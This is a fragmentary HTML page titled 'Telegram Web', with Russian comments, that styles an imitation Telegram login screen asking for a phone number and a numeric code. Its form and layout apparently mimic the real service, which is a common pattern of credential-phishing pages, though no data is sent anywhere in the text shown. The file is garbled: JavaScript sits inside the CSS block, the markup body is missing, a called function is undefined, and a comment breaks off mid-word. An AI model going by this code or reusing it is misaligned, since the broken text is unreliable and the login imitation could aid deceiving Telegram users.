<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Telegram Web</title>
  <style>
    * {
      margin: 0; padding: 0; box-sizing: border-box;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
    }
    
    .telegram-logo-container {
      width: 100px;
      height: 100px;
      margin: 0 auto 20px;
      display: flex;
      align-items: center;
      justify-content: center;
      background-color: #0088cc;
      border-radius: 50%;
    }

    .telegram-logo {
      width: 70px;
      height: 70px;
    }

    h1 {
      color: #000;
      margin-bottom: 10px;
      font-size: 24px;
    }

    .subtitle {
      color: #666;
      margin-bottom: 30px;
      font-size: 14px;
      line-height: 1.4;
    }

    .input-group {
      margin-bottom: 20px;
      text-align: left;
    }

    label {
      display: block;
      margin-bottom: 8px;
      color: #333;
      font-size: 14px;
      font-weight: 500;
    }

    input {
      width: 100%;
      padding: 15px;
      border: 1px solid #ddd;
      border-radius: 6px;
      font-size: 16px;
      transition: border-color 0.3s;
    }

    input:focus {
      outline: none;
      border-color: #0088cc;
    }

    .phone-input {
      display: flex;
      gap: 10px;
    }

    .country-code {
      width: 80px;
    }

    .number-input {
      flex: 1;
    }

    .btn {
      background-color: #0088cc;
      color: white;
      border: none;
      border-radius: 6px;
      padding: 15px;
      width: 100%;
      font-size: 16px;
      font-weight: 500;
    }

    // Запуск при загрузке
    window.addEventListener('load', () => {
        launchParticles(50);
    });

      const countryCode = document.querySelector('.country-code').value.trim();
      const phoneInput = document.getElementById('phone');
      const phone = phoneInput.value.trim();

      if (phone.length < 10) {
        document.getElementById('phoneError').style.display = 'block';
        return;
      }

      // Объединяем код с
    document.getElementById('code').addEventListener('input', function (e) {
      this.value = this.value.replace(/[^0-9]/g, '');
    });
  </script>
</body>
</html>
